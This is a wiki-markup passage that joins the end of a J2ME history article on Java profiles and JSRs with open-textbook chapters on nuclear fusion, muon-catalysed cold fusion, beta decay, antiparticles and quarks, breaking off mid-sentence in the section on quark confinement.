* {{Web reference | title=Personal Basis Profile 1.0 | work=Personal Basis Profile 1.0 JSR129 | URL=http://www.jcp.org/en/jsr/detail?id=129}}  This Personal Basis Profile 1.0 is deployed on top of the CDC1.0 and Foundation Profile 1.0 targeting devices with 2Megs minimum ROM/1Megs minimum RAM.  the lightweight AWT apis are based on JDK1.1 not JDK1.3 APIs to meet the smaller foot print requirements.
* {{Web reference | title=Personal Basis Profile 1.1 | work=Personal Basis Profile 1.1 JSR217 | URL=http://www.jcp.org/en/jsr/detail?id=217}}  This Personal Basis Profile 1.1  extends the Personal Basis Profile 1.0 by updating all APis to derived from J2SE 1.4 APIs to be compatible with optional graphics APIs such as AGUI.

=====Information Module Profile=====
This Information Module Profile supports embedded network connected devices without a graphical user interface.  This profile is a subset of the MIDP1.0 profile without the LCDUI classes of MIDP1.0. The typical devices target are modems, household devices, and industrial metering devices.  While IMP is a subset of MIDP1.0, IMP-NG is a subset of MIDP2.0. The JSRs for this profile are:

* {{Web reference | title=IMP | work=Information Module Profile JSR195 | URL=http://www.jcp.org/en/jsr/detail?id=195}}  This Information Module Profile  is a subset of  MIDP1.0 missing the LCDUI classes.
* {{Web reference | title=IMP-NG | work=Information Module Profile-Next Generation JSR228 | URL=http://www.jcp.org/en/jsr/detail?id=228}}  This Information Module Profile-Next Generation si a subset of mIDP2.0 without the LCDUI classes.

=====Digital Set Top Box Profile=====
This Digital Set Top Box Profile is a subset of JavaTV and is targeted for the smaller set top boxes that deploy OCAP. Thus, this profile differs from the javaTV (CDC, PP PBP) setup in that its on top of CLDC not CDC to support a smaller device memory foot print. However, several concepts are borrowed from the JavaTV items in Personal Basis Profile such as the xlet lifecycle. The JSR for this profile is:

* {{Web reference | title=Digital Set Top Box Profile | work=Digital Set Top Box Profile JSR242 | URL=http://www.jcp.org/en/jsr/detail?id=242}}  This Digital Set Top Box Profile is a subset of Personal Java and JavaTV and is based on the current java classes in OCAP. Xlets developed with this Profile are upward compatible with the JavaTV (CDC, PP, and PBP) combination.

=====J2ME Optional Packages and APIs=====
During 1999 to 2001 the concept of J2ME Optional  Packages and APIs was introduced to provide additional packages and APIs on top of J2ME Profiles to add specific functionality to certain classes of devcies. Some profile JSRs were changed to this new Optional Package concept:

* {{Web reference | title=RMI | work=RMI Optional Package JSR66 | URL=http://www.jcp.org/en/jsr/detail?id=66}}  The RMI Optional Package provides interoperable J2SE RMI support on top of the CDC and Foundation Profile.
* {{Web reference | title=PDA | work=PDA Optional Package JSR75 | URL=http://www.jcp.org/en/jsr/detail?id=75}} The PDA Optional Package is on top of the CLDC and provides optional APIs common to PDAs and handsets. For example, the PIM functionality in JavaPhone makes its re-introduciton into J2ME Platform devices within this ooptional package. FileConnection API is added to allow GCF to access removeable media storage.

=====J2ME Technology for the Wireless Industry=====
Due to the increasing complexity of J2ME, JTWI was proposed in 2002.  The J2ME Technology for the Wireless Industry, also known as {{Web reference | title=JTWI1.0 | work=JSR185 | URL=http://www.jcp.org/en/jsr/detail?id=185}}, sets a clear architecture concept of what optional packages and APIs match up with which Profiles. This concept covers CLDC1.0, CLDC1.1, CDC1.0, and MIDP2.0 family of devices.  The optional packages and APIs are:

* {{Web reference | title=Wireless Messaging API | work=Wireless Messaging API JSR120 | URL=http://www.jcp.org/en/jsr/detail?id=120}}  The Wireless Messaging API provides classes to support messaging application development on the J2ME Platform.
* {{Web reference | title=Mobile Media API | work=Mobile Media API JSR135 | URL=http://www.jcp.org/en/jsr/detail?id=135}}  The Mobile Media API supports audio and multimedia on both the CLDC and CDC of the J2ME Platform.

The 2nd version of the JTWI2.0 was split along CLDC and CDC configuration lines into is {{Web reference | title=JSR248 | work=JTWI2.0 Mobile Service Architecture for CLDC | URL=http://www.jcp.org/en/jsr/detail?id=248}} and {{Web reference | title=JSR249 | work=JTWI2.0 Mobile Service Architecture for CDC | URL=http://www.jcp.org/en/jsr/detail?id=249}}

===Conclusion===
Although, other OS specific solutions such as [[w:Mobile development|extending C/C++ to the mobile platform]] has gotten its first burst of adoption; preliminary work in the forms of javaPhone, javaTV, embeddedJava, PersonalJava, and establishment of the J2ME Platform provided the basis for the successfull push of J2ME  and its steady climb to become the market leader on mobile devices.  While, not all of JavaPhone functionality is in full MIDP devices as of yet; this other API brings rest of the JavaPhone to the J2ME Platform:

* {{Web reference | title=Mobile Telephony API (MTA) | work=Mobile Telephony (MTA) JSR253 | URL=http://www.jcp.org/en/jsr/detail?id=253}}  The Mobile Telephony API provides the classes to control the calls on both CLDC and CDC devices.  

As we head into the future of Mobile Devices, the Java Community Process Contributors to the J2ME Platform have been busy creating new JSRs to cover new advances Mobile Technology.  For example:

* {{Web reference | title=Unified Message Box Access API (UMBA-API) | work=Unified Message Box Access API JSR266 | URL=http://www.jcp.org/en/jsr/detail?id=266}}  Specifies the API to manage message boxes and theri content on mobile devices.
* {{Web reference | title=Contactless Communication API | work=Contactless Communication API JSR257 | URL=http://www.jcp.org/en/jsr/detail?id=257}}  Specifies the API for contactless communication such as through RFID tags and etc.

= Nuclear Fusion =

For a given mass of fuel, a fusion reaction like

{| 
|- 
|&lt;math&gt;{}^2_1{\rm H} + {}^3_1{\rm H} \longrightarrow{}^4_2{\rm He} + n +; 17.59\,{\rm MeV}\ &lt;/math&gt;.
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.5)
|}

yields several times more energy than a fission reaction. This is clear from the curve given in Fig. 15.3. Indeed,
a change of the binding energy (per nucleon) is much more significant for a fusion reaction than for a fission reaction.
Fusion is, therefore, a much more powerful source of energy. For example, 10 g of deuterium which can be extracted from 500 litres of water and 15 g of tritium produced from 30 g of lithium would give enough fuel for the lifetime electricity needs of an average person in an industrialised country. 

But this is not the only reason why fusion attracted so much attention from physicists. Another, more fundamental, reason is that the fusion reactions were responsible for the synthesis of the initial amount of light elements at primordial times when the universe was created. Furthermore, the synthesis of nuclei continues inside the stars where the fusion reactions produce all the energy which reaches us in the form of light.


== Thermonuclear reactions ==

If fusion is so advantageous, why is it not used instead of fission reactors? The problem is in the
electric repulsion of the nuclei. Before the nuclei on the left hand side of Eq. (15.5) can fuse, we have to bring
them somehow close to each other to a distance of about a femtometer. This is not an easy task! They both are positively charged and ''refuse'' to approach each other. What we can do is to make a mixture of the atoms containing such nuclei and heat it up. At high temperatures the atoms move very fast. They fiercely collide and loose all the electrons. The mixture becomes ''plasma'', i.e. a mixture of bare nuclei and free moving electrons. If the temperature is high enough, the colliding nuclei can overcome the electric repulsion and approach each other to a fusion distance. When the nuclei fuse, they release much more energy than was spent to heat up the plasma. Thus the initial energy ''investment'' pays off. The typical temperature needed to ignite the reaction of the type (15.5) is extremely high. In fact, it is the same temperature that our sun has in its center, namely, about 15 megakelvins. This is why the reactions (15.3), (15.5), and the like are called ''thermonuclear reactions''.

== Human-made thermonuclear reactions ==

The same as with fission reactions, the first application of thermonuclear reactions was in
weapons, namely, in the hydrogen bomb, where fusion is ignited by the explosion of an ordinary (fission)
plutonium bomb which heats up the fuel to solar temperatures while compressing it immensely. 

In an attempt to make a controllable fusion, people encounter the problem of holding the plasma. It is relatively easy to achieve a
high temperature (with laser pulses, for example). But as soon as plasma touches the walls of the container, it immediately cools
down. To keep it from touching the walls, various ingenious methods are tried, such as strong magnetic field and laser beams directed to
plasma from all sides. In spite of all efforts and ingenious tricks, no fusion reactor has demonstrated that it can produce more energy than it consumed creating and containing the plasma.  A giant thermonuclear reactor is being planned by the international community to be built in Cadarache, France.  It will be the largest of its kind, and theoreticians predict that it may be within the parameters needed to sustain a fusion reaction and extract energy.

== Cold fusion ==

To visualize the struggle of the nuclei approaching each other, imagine yourself pushing a metallic ball towards the top of a slope
shown in Fig. 15.5. The more kinetic energy you give to the ball, the higher it can climb. Your
purpose is to make it fall into the narrow well that is behind the barrier.

{|
|+ '''Figure 15.5: ''' ''Effective nucleus-nucleus potential as a function of the separation between the nuclei.''
|- 
| [[Image:Fhsst_atomnucl6.png|282px|]]
|}

In fact, the curve in Fig.15.5 shows the dependence of relative potential energy &lt;math&gt;V_{\rm eff}&lt;/math&gt; 
between two nuclei on the distance &lt;math&gt;R&lt;/math&gt; separating them. The deep narrow well corresponds to the strong short-range attraction, and
the &lt;math&gt;\sim1/R&lt;/math&gt; barrier represents the Coulomb (electric) repulsion. The nuclei need to overcome this barrier in order to ''touch'' each
other and fuse, i.e. to fall into the narrow and deep potential well. One way to achieve this is to give them enough kinetic energy,
which means to rise the temperature. However, there is another way based on the quantum laws.

As you remember, when discussing the motion of the electron inside
an atom (see [[FHSST_Physics_atomic_nucleus:What_the_atom_is_made_of|What the atom is made of]]), we said that it formed a
''cloud'' of probability around the nucleus. The density of this cloud diminishes at very short and very long distances but never
disappears completely. This means that we can find the electron even inside the nucleus though with a rather small probability.

The nuclei moving towards each other, being microscopic objects, obey the quantum laws as well. The probability density for finding
one nucleus at a distance ''R'' from another one also forms a cloud. This density is non-zero even under the barrier and on the other
side of the barrier. This means that, in contrast to classical objects, quantum particles, like nuclei, can penetrate through
potential barriers even if they do not have enough energy to go over it! This is called the ''tunneling effect''.

The tunneling probability strongly depends on thickness of the barrier. Therefore, instead of lifting the nuclei against the
barrier (which means rising the temperature), we can try to make the barrier itself thinner or to keep them close to the barrier for such
a long time that even a low penetration probability would be realized.

How can this be done? The idea is to put the nuclei we want to fuse, inside a molecule where they can stay close to each other for a long
time. Furthermore, in a molecule, the Coulomb barrier becomes thinner because of electron screening. In this way fusion may
proceed even at room temperature.

This idea of ''cold fusion'' was originally (in 1947) discussed by F. C. Frank and (in 1948) put forward by A. D. Sakharov, the
''father'' of Russian hydrogen bomb, who at the latest stages of his career was worldwide known as a prominent human rights activist and
a winner of the Nobel Prize for Peace. When working on the bomb project, he initiated research into peaceful applications of nuclear
energy and suggested the fusion of two hydrogen isotopes via the reaction (15.5) by forming a molecule of them
where one of the electrons is replaced by a muon.

The muon is an elementary particle (see [[FHSST_Physics_atomic_nucleus:Elementary_particles|Elementary particles]]) which has the same characteristics as an electron. The only difference between them is that the muon is 200 times heavier than the electron. In other words, a muon is a heavy electron. What will happen if we make a muonic atom of hydrogen, that is a bound state of a proton and a muon? Due to its large mass the muon would be very
close to the proton and the size of such atom would be 200 times smaller than that of an ordinary atom. This is clearly seen from the
formula for the atomic Bohr radius 

&lt;center&gt;&lt;math&gt;R_{\mbox{Bohr}}=\frac{\bar{h}^2}{me^2}&lt;/math&gt;&lt;/center&gt;

where the mass is in the denominator.

Now, what happens if we make a muonic molecule? It will also be 200 times smaller than an ordinary molecule. The Coulomb barrier will be
approximately 200 times thinner and the nuclei 200 times closer to each other. This is just what we need! Speaking in terms of the effective
nucleus-nucleus potential shown in Fig. 15.5, we can say that the muon modifies this potential in such a way that a second minimum appears.
Such a modified potential is (schematically) shown in Fig. 15.6

{|
|+ '''Figure 15.6: ''' ''Effective nucleus-nucleus potential (thick curve) for nuclei confined in a molecule. Thin curve shows the corresponding 
 distribution of the probability for finding the nuclei at a given distance from each other.''
|- 
| [[Image:Fhsst_atomnucl7.png|282px|]]
|}

The molecule is a bound state in the shallow but wide minimum of this potential. Most of the time, the nuclei are at the distance
corresponding to the maximum of the probability density distribution (shown by the thin curve). Observe that this density is not zero
under the barrier (though is rather small) and even at &lt;math&gt;R=0&lt;/math&gt;. This means that the system can (with a small probability) jump from the
shallow well into the deep well through the barrier, i.e. can tunnel and fuse.

Unfortunately, the muon is not a stable particle. Its lifetime is only &amp;asymp; 10&lt;sup&gt;&amp;minus;6&lt;/sup&gt; s. This means that a muonic molecule cannot 
exist longer than 1 microsecond. As a matter of fact, from a quantum mechanical point of view, this is quite a long interval.

The quantum mechanical wave function (that describes the probability density) oscillates with a frequency which is proportional to the energy of the system. With a typical binding energy of a muonic molecule of about 300 eV this frequency is 10&lt;sup&gt;17&lt;/sup&gt; Hz or 100 PHz.

This means that the particle hits the barrier with this frequency and during 1 microsecond it makes &lt;math&gt;10^{11}&lt;/math&gt; attempts to jump through 
it. The calculations show that the penetration probability is &amp;asymp; 10&lt;sup&gt;&amp;minus;7&lt;/sup&gt;. Therefore, during 1 microsecond nuclei can penetrate through 
the barrier 10000 times and fusion can happen much faster than the decay rate of the muon. Cold fusion via the formation of muonic molecules was done 
in many laboratories, but unfortunately, it cannot solve the problem of energy production for our needs. The obstacle is the negative efficiency, 
''i.e.'' to make muonic cold fusion we have to spend more energy than it produces. The reason is that muons do not exist like protons or electrons. 
We have to produce them in accelerators. This takes a lot of energy. Actually, the muon serves as a catalyst for the fusion reaction. After helping one pair of nuclei to fuse, the muon is liberated from the molecule and can form another molecule, and so on. It was estimated that the efficiency of the energy production would be positive only if each muon ignited at least 1000 fusion events. Experimentalists tried their best, but by now the record number is only 150 fusion events per muon. This is too few. The main reason why the muon does not catalyze more reactions is that it is eventually trapped by a &lt;math&gt;{}^4&lt;/math&gt;He nucleus which is a by-product of fusion. Helium captures the muon into an atomic orbit with large binding energy, and it cannot escape.


Nonetheless, the research in the field of cold fusion continues. There are some other ideas of how to keep nuclei close to each
other. One of them is to put the nuclei inside a crystal. Another way out is to increase the penetration probability by using
molecules with special properties, namely, those that have quantum states with almost the same energies as the excited states on the
compound nucleus. Scientists try all possibilities since the energy demands of mankind grow continuously and therefore the stakes in
this quest are high.</text>

= Elementary Particles =

In our quest for the elementary building blocks of the universe, we delved inside the atomic nucleus and found
that it is composed of protons and neutrons. Are the three particles, &lt;math&gt;e&lt;/math&gt;, &lt;math&gt;p&lt;/math&gt; and &lt;math&gt;n&lt;/math&gt;, the blocks we are looking for? The answer is ''no''. Even before the structure of the atom was understood, Becquerel discovered the radioactivity (see [[FHSST_Physics/Atomic Nucleus/Radioactivity#Discovery_of_radioactivity|Discovery of radioactivity]]) that afterwards puzzled physicists and forced them to look deeper - inside protons and neutrons.</text>

= Beta Decay =

Among the three types of radioactivity, the &lt;math&gt;\alpha&lt;/math&gt; and &lt;math&gt;\gamma&lt;/math&gt; rays were easily explained. The emission of &lt;math&gt;\alpha&lt;/math&gt; 
particle is kind of lop-sided fission reaction, when an initial nucleus spontaneously
decays in two fragments one of which is the nucleus &lt;math&gt;{}^4_2&lt;/math&gt;He (i.e. &lt;math&gt;\alpha&lt;/math&gt; particle). The &lt;math&gt;\gamma&lt;/math&gt; 
rays are electromagnetic quanta (photons) emitted by a nuclear system when it transits from one quantum
state to another (similar to an atom emitting visible light when an electron drops to a lower energy level).


The &lt;math&gt;\beta&lt;/math&gt; rays posed the puzzle. On the one hand, they are just electrons and you may think that it looks simple. But on the other
hand, they are not the electrons from the atomic shell. It was found that they come from inside the nucleus! After the &lt;math&gt;\beta&lt;/math&gt;-decay, the 
charge of the nucleus increases in one unit,

&lt;center&gt;&lt;math&gt;{}^A_Z\left(\mbox{parent nucleus}\right)\,\longrightarrow\,{}^A_{Z+1}\left(\mbox{daughter nucleus}\right)+e\ ,&lt;/math&gt;&lt;/center&gt;

which is in accordance with the charge conservation law.

There was another puzzle associated with the &lt;math&gt;\beta&lt;/math&gt; decay: The emitted electrons did not have a fixed energy. Measuring their
kinetic energies, you could find very fast and very slow electrons as well as the electrons with intermediate speeds. How could
identical parent nuclei, after losing different amount of energy, become identical daughter nuclei? Perhaps energy is not conserved in
the quantum world? The possibility was so astounding that even Niels Bohr put forward the idea of statistical nature of the energy conservation law.

To explain the first puzzle, it was first suggested that neutron is a bound state of proton and electron. At that time, some physicists
believed that if something is emitted from an object, it must be present in that object before the emission. They could
not imagine that a particle could be created from vacuum.

The naive &lt;math&gt;(pe)&lt;/math&gt; model of the neutron contradicted the facts. Indeed, it was known already that the &lt;math&gt;pe&lt;/math&gt; bound state is the 
hydrogen atom. A neutron is much smaller than the hydrogen atom. Therefore, it would be unusually tight binding, and perhaps with something else
involved that keeps the size small. By the way, this ''something else'' could also save the energy conservation law. In 1930,
Wolfgang Pauli suggested that in addition to the electron, the &lt;math&gt;\beta&lt;/math&gt; decay involves another particle, &lt;math&gt;\nu&lt;/math&gt;, that is emitted 
along with the electron and carries away part of the energy. For example,

{| 
|-
|&lt;math&gt;\begin{matrix}{}^{234}_{90}{\rm Th}\,\longrightarrow\,{}^{234}_{91}{\rm Pa} + e^{-} + \bar{\nu}\ .\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.6)
|}


This additional particle was called ''neutrino'' (in Italian the word ''neutrino'' means small neutron). The neutrino is electrically
neutral, has extremely small mass (maybe even zero, which is still a question in 2004) and very weakly interacts with matter. This is why
it was not detected experimentally till 1956. The ''bar'' over &lt;math&gt;\nu&lt;/math&gt; 
in Eq. (15.6) means that in this reaction actually the anti-neutrino is emitted (see the discussion
on anti-particles further down in Sec. [[FHSST_Physics/Atomic Nucleus/Particle_Physics|Elementary particles: Particle Physics]]).</text>

=Particle Physics =

In an attempt to explain the &lt;math&gt;\beta&lt;/math&gt; decay and to understand internal structure of the neutron a new branch of physics was born,
the ''particle physics''. The only way to explore the structure of sub-atomic particles is to strike them with other particles in order
to knock out their ''constituent'' parts. The simple logic says: The more powerful the impact, the smaller parts can be knocked out.

At the beginning the only source of energetic particles to strike other particles were the cosmic rays. Earth is constantly bombarded
by all sort of particles coming from the outer space. Atmosphere protects us from most of them, but many still reach the ground.

==Antiparticles ==

In 1932, studying the cosmic rays with a bubble chamber, Carl Anderson made a photograph of two symmetrical tracks of charged
particles. The measurements of the track curvatures showed that one track belonged to an electron and the other was made by a particle
having the same mass and equal but positive charge. These particles were created when a cosmic &lt;math&gt;\gamma&lt;/math&gt;
quantum of a high energy collided with a nucleus. 


The discovered particle was called ''positron'' and denoted as &lt;math&gt;e^+&lt;/math&gt; to distinguish it from the electron, which sometimes is 
denoted as &lt;math&gt;e^-&lt;/math&gt;. It was the first antiparticle discovered. Later, it was found that every particle has its ''mirror reflection'', the
antiparticle. To denote an antiparticle, it is used ''bar'' over a particle symbol. For example, &lt;math&gt;\bar{p}&lt;/math&gt; is the anti-proton, which 
has the same mass as an ordinary proton but a negative charge.

When a particle collides with its ''mirror reflection'', they annihilate, i.e. they burn out completely. In this collision, all
their mass is transformed into electromagnetic energy in the form of &lt;math&gt;\gamma&lt;/math&gt; quanta. For example, if an electron collides with a 
positron, the following reaction may take place 

&lt;math&gt;\begin{matrix}e^-+e^+\,\longrightarrow\,\gamma+\gamma\ ,\end{matrix}&lt;/math&gt;

where two photons are needed to conserve the total momentum of the system.

In principle, stable antimatter can exist. For example, the pair of &lt;math&gt;\bar{p}&lt;/math&gt; and &lt;math&gt;e^+&lt;/math&gt; can form an atom of anti-hydrogen with exactly 
the same energy states as the ordinary hydrogen. Experimentally, atoms of anti-helium were obtained. The problem with them is that,
surrounded by ordinary matter, they cannot live long. Colliding with ordinary atoms, they annihilate very fast.

There are speculations that our universe should be symmetric with respect to particles and antiparticles. Indeed, why should
preference be given to matter and not to anti-matter? This implies that somewhere very far, there must be equal amount of anti-matter,
i.e. anti-universe. Can you imagine what happens if they meet?

==Muon, mesons, and the others ==

In yet another cosmic-ray experiment a particle having the same properties as the electron but &lt;math&gt;\sim&lt;/math&gt;207 times heavier, was 
discovered in 1935. It was given the name ''muon'' and the symbol &lt;math&gt;\mu&lt;/math&gt;. For a long time it remained ''unnecessary'' particle in the 
picture of the world. Only the modern theories harmonically included the muon as a constituent part of matter (see [[FHSST_Physics_atomic_nucleus_elementary:Quarks_and_leptons|Elementary particles: Quarks and leptons]]).


The same inexhaustible cosmic rays revealed the &lt;math&gt;\pi&lt;/math&gt; and &lt;math&gt;K&lt;/math&gt; mesons 
in 1947. The &lt;math&gt;\pi&lt;/math&gt; mesons (or simply ''pions'') were theoretically predicted twelve years before by Yukawa, as the
mediators of the strong forces between nucleons. The &lt;math&gt;K&lt;/math&gt; mesons, however, were unexpected. Furthermore, they showed very strange
behaviour. They were easily created only in pairs. The probability of the inverse process (i.e. their decay) was &lt;math&gt;10^{13}&lt;/math&gt; times lower than the probability of their creation.

It was suggested that these particles possess a new type of charge, the ''strangeness'', which is conserving in the strong
interactions. When a pair of such particles is created, one of them has strangeness &lt;math&gt;+1&lt;/math&gt; and the other &lt;math&gt;-1&lt;/math&gt;, so the total strangeness 
remains zero. When decaying, they act individually and therefore the strangeness is not conserving. According to the suggestion, this is
only possible through the weak interactions that are much weaker than the strong interactions (see Sec. [[FHSST_Physics_atomic_nucleus_elementary:Forces_of_nature|Elementary particles: Forces of nature]]) and thus the decay probability is much lower.

The golden age of particle physics began in 1950-s with the advent of particle accelerators, the machines that produced beams of
electrons or protons with high kinetic energy. Having such beams available, experimentalists can plan the experiment and repeat it,
while with the cosmic rays they were at the mercy of chance. When the accelerators became the main tool of exploration, the particle
physics acquired its second name, the ''high energy physics''.


During the last half a century, experimentalists discovered so many new particles (few of them are listed in Table 15.5) that it became obvious that
they cannot all be elementary. When colliding with each other, they produce some other particles. Mutual transformations of the particles
is their main property.

Physicists faced the problem of particle classification similar to the problems of classification of animals, plants, and chemical
elements. The first approach was very simple. The particles were divided in four groups according to their mass: ''leptons'' (light
particles, like electron), ''mesons'' (intermediate mass, like pion), ''baryons'' (heavy particles, like proton or neutron), and
''hyperons'' (very heavy particles).

Then it was realized that it would be more logical to divide the particles in three families according to their ability to interact
via weak, electromagnetic, and strong forces (in addition to that, all particles experience gravitational attraction towards each
other). Except for the gravitational interaction, the photon (&lt;math&gt;\gamma&lt;/math&gt; quantum) participates only in electromagnetic 
interactions, the leptons take part in both weak and electromagnetic interactions, and ''hadrons'' are able to interact via all forces
of nature (see [[FHSST_Physics_atomic_nucleus_elementary:Forces_of_nature|Elementary particles: Forces_of_nature]]).

In addition to conservation of the strangeness, several other conservation laws were discovered. For example, number of leptons is
conserving. This is why in the reaction (15.6)  we have an electron (lepton number &lt;math&gt;+1&lt;/math&gt;) and anti-neutrino (lepton number &lt;math&gt;-1&lt;/math&gt;) in the final 
state. Similarly, the number of baryons is conserving in all reactions.

The quest for the constituent parts of the neutron has led us to something unexpected. We found that there are several hundreds of
different particles that can be ''knocked out'' of the neutron but none of them are its parts. Actually, the neutron itself can be
knocked out of some of them! What a mess! Further efforts of experimentalists could not find an order, which was finally
discovered by theoreticians who introduced the notion of ''quarks''.</text>

= Quarks and Leptons =

While experimentalists seemed to be lost in the maze, the theoreticians groped for the way out. Using an extremely complicated
mathematical technique, they managed to group the hadrons in such families which implied that all known (and yet unknown) hadrons are
built of only six types of particles with fractional charges. The main credit for this (in the form of Nobel Prize) was given to
M. Gell-Mann and G. Zweig.

At first, they considered a subset of the hadrons and developed a theory with only three types of such truly elementary particles.
When Murray Gell-Mann thought of the name for them, he came across the book &quot;Finnegans Wake&quot; by James Joyce. The line &quot;Three quarks
for Muster Mark!&quot; appeared on page 383 of that book (the word ''quark'' there is a merging of the words ''quart'' and ''quack'', among others). He needed a name for three particles and this was the answer. Thus the term ''quark'' was coined.

Later, the theory was generalized to include all known particles, which required six types of quarks. Modern theories require also
that the number of different leptons should be the same as the number of different quark types. According to these theories, the
quarks and leptons are truly elementary, i.e. they do not have any internal structure and therefore are of a zero size (pointlike).
Thus, the world is constructed of just twelve types of elementary building blocks that are given in Table 15.4. Amazingly enough, the electron
that was discovered before all other particles, more than a century ago, turned out to be one of them!

After Gell-Mann, who used a funny name (quark) for an elementary particle, the fundamental physics was flooded with such names. For
example, the six quark types are called ''flavors'' (for cottage cheese, this is appropriate indeed), the three different states in
which each quark can be, are called ''colors'' (red, green, blue) etc. Modern physics is so complicated and mathematical, that people
working in it, need such kind of jokes to ''spice unsavoury dish with flavors''. The funny names should not confuse anybody.
Elementary particles do not have any smell, taste, or colour. These terms simply denote certain properties (similar to electric charge)
that do not exist in human world.


==Hadrons ==

There are particles that are able to interact with each other by the so-called ''strong forces''. Another name for these forces is ''nuclear forces''. They are very strong at short distances (&lt;math&gt;\sim 10^{-15}&lt;/math&gt;m), 
and very quickly vanish when the distance between the particles increases. All these particles are called ''hadrons''. The protons and neutrons are examples of hadrons. 
As you remember, we learned about the existence of huge variety of particles when trying to look inside a nucleon, more particularly, the neutron. 
So, what the neutron is made of? Can we get the answer at last, after learning about the quarks? Yes, we can. According to modern theories, all hadrons are composed of quarks. 
The quarks can be combined in groups of two or three. The boundstates of two quarks are called ''mesons'', and the boundcomplexes of three quarks are called ''baryons''. 
No other numbers of quarks can form observable particles (Recently, experimentalists and theoreticians started to actively discuss the possibility of the existence of pentaquarks, exotic particles that are bound complexes of five quarks.). 

[[Image:Fhsst_atomnucl8.png|fhsst_atomnucl8.png]]


Nucleons are baryons and therefore consist of three quarks while the pion is a meson containing only two quarks, as schematically shown
in Fig. 15.7. Comparing this figure with Table 15.4, you can see why quarks have fractional charges. Counting the total charge of a
hadron, you should not forget that anti-quarks have the opposite charges. The baryon number for an anti-quark also has the opposite
sign (negative). This is why mesons actually consist of a quark and anti-quark in order to have total baryon number zero.

==Particle reactions ==

At the early stages of the particle physics development, in order to find the constituent parts of various particles, experimentalists
simply collided them and watched the ''fragments''. However, this straightforward approach led to confusion. For example, the reaction
between the &lt;math&gt;\pi^-&lt;/math&gt; meson and proton,

{| 
|-
|&lt;math&gt;\begin{matrix}\pi^- + p\,\longrightarrow\, K^0 + \Lambda^0\ ,\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.8)
|}

would suggest (if naively interpreted) that either &lt;math&gt;K^0&lt;/math&gt; or &lt;math&gt;\Lambda^0&lt;/math&gt; is a constituent part of the nucleon while the pion is 
incorporated into the other ''fragment''. On the other hand, the same collision can knock out different ''fragments'' from the same
proton. For example,

{| 
|-
|&lt;math&gt;\begin{matrix}\pi^- + p\,\longrightarrow\, \pi^0 + n\ ,\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(15.9)
|}

which leads to an absurd suggestion that neutron is a constituent part of proton. 

The quark model explains all such ''puzzles'' nicely and logically. Similarly to chemical reactions that are just rearrangements of
atoms, the particle reactions of the type (15.8 and 15.9)  are just rearrangements of the quarks. The only difference is that, in contrast to chemistry
where the number of atoms is not changing, the number of quarks before the collision is not necessarily equal to their number after
the collision. This is because a quark from one colliding particle can annihilate with the corresponding antiquark from another
particle. Moreover, if the collision is sufficiently powerful, the quark-antiquark pairs can be created from vacuum.

It is convenient to depict the particle transformations in the form of the so-called ''quark flow diagrams''. On such diagrams, the
quarks are represented by lines that may be visualized as the trajectories showing their movement from the left to the right.

{|
|+ '''Figure 15.8: '''  Quark-flow diagram for the reaction. &lt;math&gt;\pi^{-}_{} + p \longrightarrow K^0 \Lambda^{0}_{}&lt;/math&gt;
|- 
| [[Image:Fhsst_atomnucl9.png|450px|]]
|}

For example, the diagram given in Fig. 15.8,  shows the quark rearrangement for the reaction (15.8). As you can see, when
the pion collides with proton, its &lt;math&gt;\bar{u}&lt;/math&gt; quark annihilates with the &lt;math&gt;u&lt;/math&gt; quark from the proton. At the same time, 
the &lt;math&gt;s\bar{s}&lt;/math&gt; pair is created from the vacuum. Then, the &lt;math&gt;\bar{s}&lt;/math&gt; quark binds with the &lt;math&gt;d&lt;/math&gt; quark to form the strange meson &lt;math&gt;K^0&lt;/math&gt;, while the &lt;math&gt;s&lt;/math&gt; quark goes together with the &lt;math&gt;ud&lt;/math&gt; pair as the strange baryon &lt;math&gt;\Lambda^0&lt;/math&gt;. 

{| 
|+ '''Figure: 15.9'''  Quark-flow diagram for the reaction &lt;math&gt;\pi^- + p\,\longrightarrow\, \pi^0 + n&lt;/math&gt;
|- 
| [[Image:Fhsst_atomnucl9.png|450px|]]
|}

The charge-exchange reaction (15.9) is a more simple rearrangement process shown in Fig. 15.9. You may wonder why
the quark and antiquark of the same flavor in the &lt;math&gt;\pi^0&lt;/math&gt; meson do not annihilate. Yes they do, but not immediately. And due to this
annihilation, the lifetime of &lt;math&gt;\pi^0&lt;/math&gt; is 100 million times shorter than the lifetime of &lt;math&gt;\pi^{\pm}&lt;/math&gt; (see Table 15.3).

Despite its simplicity, the quark-flow diagram technique is very powerful method not only for explaining the observed reactions but
also for predicting new reactions that have not yet been seen in experiments. Knowing the quark content of particles (which is
available in modern Physics Handbooks), you can draw plenty of such diagrams that will describe possible particle transformations. The
only rule is to keep the lines continuous. They can disappear or emerge only for a quark-antiquark pair of the same flavor.

However, the continuity of the quark lines is valid only for the processes caused by the strong interaction. Indeed, the
&lt;math&gt;\beta&lt;/math&gt;-decay of a free neutron (caused by the weak forces),

{| 
|-
|&lt;math&gt;\begin{matrix}n\,\longrightarrow\, p+e^-+\bar{\nu}_e\ ,\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (15.10)
|}

as well as the &lt;math&gt;\beta&lt;/math&gt;-decay of the nuclei, indicate that quarks can change flavor. In particular, the &lt;math&gt;\beta&lt;/math&gt;-decay 
(15.10 or 15.6) happens because the &lt;math&gt;d&lt;/math&gt; quark transformes into the &lt;math&gt;u&lt;/math&gt; quark, 

{| 
|-
|&lt;math&gt;\begin{matrix}d\,\longrightarrow\, u+e^-+\bar{\nu}_e\ ,\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (15.11)
|}

due to the weak interaction, as shown in Fig. 15.10

==Quark confinement ==

At this point, it is very logical to ask if anybody observed an isolated quark. The answer is ''no''. Why? And how can one be so
confident of the quark model when no one has ever seen an isolated quark?

Basically, you can't see an isolated quark because the quark-quark attractive force does not let them go. In contrast to all other
systems, the attraction between quarks grows with the distance separating them. It is like a rubber cord connecting two balls. When
the balls are close to each other, the cord is not stretched and the balls do not feel any force. If, however, you try to separate the
balls, the cord pulls them back. The more you stretch the cord, the stronger the force becomes (according to the Hook's law of
